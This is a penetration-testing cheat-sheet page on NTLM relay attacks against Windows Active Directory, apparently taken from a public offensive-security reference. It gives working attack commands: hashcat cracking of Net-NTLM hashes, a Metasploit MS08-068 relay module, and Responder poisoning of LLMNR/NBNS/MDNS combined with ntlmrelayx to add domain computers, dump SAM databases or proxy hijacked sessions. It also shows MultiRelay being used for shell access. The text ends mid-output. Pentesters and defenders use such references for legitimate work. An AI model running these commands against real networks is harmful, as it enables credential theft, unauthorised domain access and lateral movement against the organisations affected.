# Internal - NTLM Relay - Internal All The Things
URL: https://swisskyrepo.github.io/InternalAllTheThings/active-directory/internal-relay-ntlm/

Internal - NTLM Relay - Internal All The Things

# Internal - NTLM Relay

NTLMv1 and NTLMv2 can be relayed to connect to another machine.

| Hash | Hashcat | Attack method |
| --- | --- | --- |
| LM | `3000` | crack/pass the hash |
| NTLM/NTHash | `1000` | crack/pass the hash |
| NTLMv1/Net-NTLMv1 | `5500` | crack/relay attack |
| NTLMv2/Net-NTLMv2 | `5600` | crack/relay attack |

Crack the hash with `hashcat`.

```
hashcat -m 5600 -a 0 hash.txt crackstation.txt

```

## MS08-068 NTLM reflection

NTLM reflection vulnerability in the SMB protocolOnly targeting Windows 2000 to Windows Server 2008.

> This vulnerability allows an attacker to redirect an incoming SMB connection back to the machine it came from and then access the victim machine using the victim’s own credentials.

- https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS08-068

```
msf > use exploit/windows/smb/smb_relay
msf exploit(smb_relay) > show targets

```

## LDAP signing not required and LDAP channel binding disabled

During security assessment, sometimes we don't have any account to perform the audit. Therefore we can inject ourselves into the Active Directory by performing NTLM relaying attack. For this technique three requirements are needed:

- LDAP signing not required (by default set to `Not required`)
- LDAP channel binding is disabled. (by default disabled)
- `ms-DS-MachineAccountQuota` needs to be at least at 1 for the account relayed (10 by default)

Then we can use a tool to poison `LLMNR`, `MDNS` and `NETBIOS` requests on the network such as `Responder` and use `ntlmrelayx` to add our computer.

```
# On first terminal
sudo ./Responder.py -I eth0 -wfrd -P -v

# On second terminal
sudo python ./ntlmrelayx.py -t ldaps://IP_DC --add-computer

```

It is required here to relay to LDAP over TLS because creating accounts is not allowed over an unencrypted connection.

## SMB Signing Disabled and IPv4

If a machine has `SMB signing`:`disabled`, it is possible to use Responder with Multirelay.py script to perform an `NTLMv2 hashes relay` and get a shell access on the machine. Also called LLMNR/NBNS Poisoning

1. Open the Responder.conf file and set the value of `SMB` and `HTTP` to `Off`.

```
[Responder Core]
; Servers to start
...
SMB = Off     # Turn this off
HTTP = Off    # Turn this off

```
2. Run `python RunFinger.py -i IP_Range` to detect machine with `SMB signing`:`disabled`.
3. Run `python Responder.py -I <interface_card>`
4. Use a relay tool such as `ntlmrelayx` or `MultiRelay`

- `impacket-ntlmrelayx -tf targets.txt` to dump the SAM database of the targets in the list.
- `python MultiRelay.py -t <target_machine_IP> -u ALL`
5. ntlmrelayx can also act as a SOCK proxy with every compromised sessions.

```
$ impacket-ntlmrelayx -tf /tmp/targets.txt -socks -smb2support
[*] Servers started, waiting for connections
Type help for list of commands
ntlmrelayx> socks
Protocol  Target          Username                  Port
--------  --------------  ------------